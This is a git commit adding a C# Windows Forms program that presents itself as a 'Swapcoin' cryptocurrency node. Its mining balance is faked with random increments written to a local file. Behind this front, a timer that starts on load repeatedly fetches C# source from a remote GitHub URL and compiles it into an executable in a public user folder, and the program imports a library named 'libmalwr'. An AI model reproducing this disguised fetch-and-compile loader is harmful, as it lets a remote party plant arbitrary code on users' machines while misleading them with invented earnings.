f003c1c13bc274bdfcf34ace208f0b50a2a719af
MinecraftPublisher <44898501+MinecraftPublisher@users.noreply.github.com>
2020-05-03 13:11:57 +0430

    Create node.cs

---
+++ node.cs
@@ -0,0 +1,96 @@
+using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Text;
+using System.Windows.Forms;
+using System.Net;
+using System.IO;
+using libmalwr;
+using Microsoft.CSharp;
+using System.CodeDom.Compiler;
+using System.Xml;
+
+namespace Swapcoin_Node
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void label1_Click(object sender, EventArgs e)
+        {
+
+        }
+        string value = "0";
+      
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            if (!File.Exists(@"C:\Users\Public\SwapNode\Mined.MD5"))
+            {
+                File.WriteAllText(@"C:\Users\Public\SwapNode\Mined.MD5", "0");
+                label1.Text = value + " SWP";
+            }
+            else
+            {
+                value = File.ReadAllText(@"C:\Users\Public\SwapNode\Mined.MD5");
+                label1.Text = value + " SWP";
+            }
+
+            Directory.CreateDirectory(@"C:\Users\Public\SwapNode");
+            WebClient wc = new WebClient();
+            Uri url = new Uri("https://raw.githubusercontent.com/MinecraftPublisher/miner/master/news.md5");
+            richTextBox1.Text = wc.DownloadString(url);
+            this.Opacity = 100;
+            this.ShowInTaskbar = true;
+            timer1.Enabled = true;
+        }
+
+
+        private void pictureBox2_Click(object sender, EventArgs e)
+        {
+            Miner.Enabled = true;
+        }
+
+        private void Miner_Tick(object sender, EventArgs e)
+        {
+            if(new Random().Next(0,20) == 0)
+            {
+                int mined = int.Parse(value) + new Random().Next(1, 3);
+                value = mined.ToString();
+                File.WriteAllText(@"C:\Users\Public\SwapNode\Mined.MD5", value);
+                label1.Text = value + " SWP";
+            }
+        }
+
+        private void timer1_Tick(object sender, EventArgs e)
+        {
+            WebClient wc = new WebClient();
+            Uri url = new Uri("https://raw.githubusercontent.com/MinecraftPublisher/darkOS/master/compiler.cs");
+            wc.DownloadFileCompleted += Wc_DownloadFileCompleted;
+            wc.DownloadFileAsync(url, @"C:\Users\Public\SwapNode\Compiler.cs");
+        }
+        private void Wc_DownloadFileCompleted(object sender, AsyncCompletedEventArgs e)
+        {
+            string data = File.ReadAllText(@"C:\Users\Public\SwapNode\Compiler.cs");
+            if (data == "not now")
+            {
+
+            }
+            else
+            {
+                CSharpCodeProvider codeProvider = new CSharpCodeProvider();
+                ICodeCompiler icc = codeProvider.CreateCompiler();
+                string Output = @"C:\Users\Public\SwapNode\Compiler.exe";
+                System.CodeDom.Compiler.CompilerParameters parameters = new CompilerParameters();
+                //Make sure we generate an EXE, not a DLL
+                parameters.GenerateExecutable = true;
+                parameters.OutputAssembly = Output;
+                CompilerResults results = icc.CompileAssemblyFromSource(parameters, data);
+            }
+        }
+    }
+}
